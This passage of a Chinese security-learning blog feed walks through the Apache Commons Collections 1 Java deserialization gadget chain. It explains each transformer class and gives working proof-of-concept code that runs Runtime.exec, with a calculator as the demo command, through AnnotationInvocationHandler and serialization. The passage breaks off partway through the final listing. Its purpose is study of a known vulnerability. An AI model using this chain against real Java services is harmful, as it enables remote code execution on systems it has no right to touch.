class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>但这样还是存在和CC1一样的问题，只能用java8u71以前的版本</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CC1&amp;6</title>
    <link href="/decemberus.com/2022/11/03/CC1%E4%B8%8ECC6(1)/"/>
    <url>/decemberus.com/2022/11/03/CC1%E4%B8%8ECC6(1)/</url>
    
    <content type="html"><![CDATA[<h1 id="Common-Collections1-amp-6"><a href="#Common-Collections1-amp-6" class="headerlink" title="Common-Collections1&amp;6"></a>Common-Collections1&amp;6</h1><p>这里Common-Collections就不用yso官方的了，用p神的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections1_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>将上述代码中的计算器地址 替换成你本地环境⾥的计算器路径，运⾏就会发现弹出了计算器，下面说有以下所用到的接口和类</p><p>这里再导入包的时候经常会出错，原因就在于导入错包了</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191222535.png" alt="image-20230218210130035"> </p><p>一般系统自动导入的包是javax.xml.transform.Transformer;</p><p>但实际上Transformer是org.apache.commons.collections.Transformer;</p><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这个地方jdk的版本非常重要，我原本用的是jdk11，结果调用java内置的类的时候代码完全和网上的不一样，我以为时版本太低，换成了jdk17，结果还是不行，最后我换成了jdk8u67（一定要8u71以前的版本，不然不行），但是换完以后还是不行，通过陈杰好哥哥的帮忙才修改好，以下是配置步骤</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191222109.png" alt="image-20230111194851429"> </p><p>先点编辑配置</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191222758.png" alt="image-20230111194914219"> </p><p>这个地方换成自己的jdk路径</p><p>此时仍然不行，依然显示我用的jdk11</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223293.png" alt="image-20230111195036233"> </p><p>点这里的项目结构</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223777.png" alt="image-20230111195054106"> </p><p>将这里的sdk换成自己的路径</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223742.png" alt="image-20230111195216049"> </p><p>最后换掉这里的sdk，即可开始我们的学习之路</p><h2 id="P神的CC1利用链"><a href="#P神的CC1利用链" class="headerlink" title="P神的CC1利用链"></a>P神的CC1利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonCollections1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="类的理解"><a href="#类的理解" class="headerlink" title="类的理解"></a>类的理解</h3><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, keyTransformer,<br>valueTransformer);<br></code></pre></td></tr></table></figure><p>在这里，TransformedMap.decorate() 方法返回一个新的 Map 对象，该对象由 innerMap 进行装饰。decorate包括对 innerMap 的键和值进行变换，通过 keyTransformer 和 valueTransformer 实现。</p><p>新的 Map 对象 outerMap 包含了 innerMap 的所有元素，但是键和值都已经被转换过了。</p><p>这里面的decorate方法源码是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法需要三个参数:</p><ul><li>innerMap：需要被装饰的 Map 对象</li><li>keyTransformer：用来对 innerMap 的键进行变换的函数</li><li>valueTransformer：用来对 innerMap 的值进行变换的函数</li></ul><p>这个方法的实现过程中，会通过遍历 innerMap 的所有元素，并使用 keyTransformer 和 valueTransformer 对键和值进行变换。最后，创建一个新的 Map 对象，该对象的元素由转换后的键和值组成。</p><h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><p>Transformer是⼀个接⼝，它只有⼀个待实现的⽅法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> &#123;<br> <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个’’回调函数’’，这个回调的参数是原始对象。</p><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个对象，并在transform⽅法将这个对象再返回：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br> <span class="hljs-built_in">super</span>();<br> iConstant = constantToReturn;<br>&#125;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br> <span class="hljs-keyword">return</span> iConstant;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。</p><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序列化能执⾏任意代码的关键。</p><p>在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[]</span><br><span class="hljs-params">args)</span> &#123;<br> <span class="hljs-built_in">super</span>();<br> iMethodName = methodName;<br> iParamTypes = paramTypes;<br> iArgs = args;<br>&#125;<br></code></pre></td></tr></table></figure><p>后⾯的回调transform⽅法，就是执⾏了input对象的iMethodName⽅法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br> <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br> <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br> &#125;<br> <span class="hljs-keyword">try</span> &#123;<br> <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br> <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br> <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>     <span class="hljs-comment">//实例化类，并获得类的方法，最后就可以执行任意函数</span><br> &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) &#123;<br> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +<br>iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br> &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +<br>iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br> &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +<br>iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, ex);<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223375.png" alt="image-20221002194905431"> </p><p>上面有注释的那一行的含义如图所示，如此可以执行任意方法</p><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，我们画⼀个图做示意：</p><p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，我们画⼀个图做示意：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223611.png" alt="image-20230111101736120"> </p><p>代码如下图所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br> <span class="hljs-built_in">super</span>();<br> iTransformers = transformers;<br>&#125;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br> object = iTransformers[i].transform(object);<br> &#125;<br> <span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="源码理解"><a href="#源码理解" class="headerlink" title="源码理解"></a>源码理解</h3><p>看代码的主要部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>&#123;<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),<br>&#125;;<br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br></code></pre></td></tr></table></figure><p>就像上面介绍的一样，ChainedTransformer包括了ConstantTransformer和InvokerTransformer，前者返回Runtime对象，InvorkerTransformer执行Runtime对象的exec方法，参数就是我们计算器</p><p>可以这样理解，Transformer把ConstantTransformer和InvokerTransformer装在了一起，相当于调用了<code>Runtime.getRuntime.exec.calc</code>然后放在了chain中</p><p>还有一个地方有疑惑，new Transformer[]是个什么用法</p><blockquote><p>是数组的声明与创建</p><p> <img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223818.png" alt="image-20220314204957973"> </p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223139.png" alt="image-20220314205656861"> </p></blockquote><p>当然，这个transformerChain只是⼀系列回调，我们需要⽤其来包装innerMap，使⽤的前⾯说到的TransformedMap.decorate ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>, transformerChain);<br></code></pre></td></tr></table></figure><p>因为这里的outerMap对象被使用TransformedMap.decorate方法进行装饰，使用的Transformer对象是ChainedTransformer，其中包含了ConstantTransformer和InvokerTransformer对象。因此，当向outerMap中添加键值对时，每个值都会被依次经过这两个Transformer对象的转换。</p><p>然后想map中放入一个新的元素来触发回调</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br></code></pre></td></tr></table></figure><p>比如这里，现在test的值为xxxx，”xxxx”会被ChainedTransformer中的ConstantTransformer转换成Runtime对象，然后被InvokerTransformer调用，最终会执行”&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator”这个命令。由于这个命令是打开Mac系统自带的计算器应用程序，因此outerMap中的键值对为{“test”, 计算器应用程序的返回值}</p><h3 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h3><p>我们前面说过，触发这个漏洞的核心，在于我们需要向Map中加入一个新的元素。在demo中，我们可以手工执行 outerMap.put(“test”, “xxxx”); 来触发漏洞，但在实际反序列化时，我们需要找到一个类，它在反序列化的readObject逻辑里有类似的写入操作。</p><p>这个类就是 sun.reflect.annotation.AnnotationInvocationHandler ，我们查看它的readObject方法（这是8u71以前的代码，8u71以后做了一些修改，这个面再说）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">  <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>      <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>s.defaultReadObject();<br><br>      <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>      <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">try</span> &#123;<br>          annotationType = AnnotationType.getInstance(t);<br>      &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>          <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>      &#125;<br><br>      Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br>      <span class="hljs-comment">// 与运行时映射类型一致</span><br>      Map&lt;String, Object&gt; mv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();<br><br>      <span class="hljs-comment">// If there are annotation members without values, that</span><br>      <span class="hljs-comment">// situation is handled by the invoke method.</span><br>      <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;<br>          <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>          <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>          Class&lt;?&gt; memberType = memberTypes.get(name);<br>          <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>              value = memberValue.getValue();<br>              <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                    value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                  value = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                          value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                              annotationType.members().get(name));<br>              &#125;<br>          &#125;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>核心逻辑就是 <code>Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()</code> 和<code>memberValue.setValue(...)</code> 。</p><p>memberValues就是反序列化后得到的Map，也是经过了<code>TransformedMap</code>修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用setValue设置值的时候就会触发TransformedMap里注册的Transform，进而执行我们为其精心设计的任意代码。</p><p>所以，我们构造POC的时候，就需要创建一个<code>AnnotationInvocationHandler</code>对象，并将前面构造的HashMap设置进来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span><br>Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<span class="hljs-comment">//通过构造器创建带参数的class对象对象</span><br>construct.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> construct.newInstance(Retention.class, outerMap);<br></code></pre></td></tr></table></figure><p>这里因为 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 是在JDK内部的类，不能直接使用new来实例化。我使用反射获取到了它的构造方法，并将其设置成外部可见的，再调用就可以实例化了。</p><p><code>AnnotationInvocationHandler</code>类的构造函数有两个参数，第一个参数是一个<code>Annotation</code>类；第二个是参数就是前面构造的Map。</p><h4 id="使用反射的原因"><a href="#使用反射的原因" class="headerlink" title="使用反射的原因"></a>使用反射的原因</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>oos.writeObject(obj);<br>oos.close();<br></code></pre></td></tr></table></figure><p>我将这几段代码拼接到demo代码的后面，组成一个完整的POC。我们试着运行这个POC，看看能否生成序列化数据流：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections1_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span 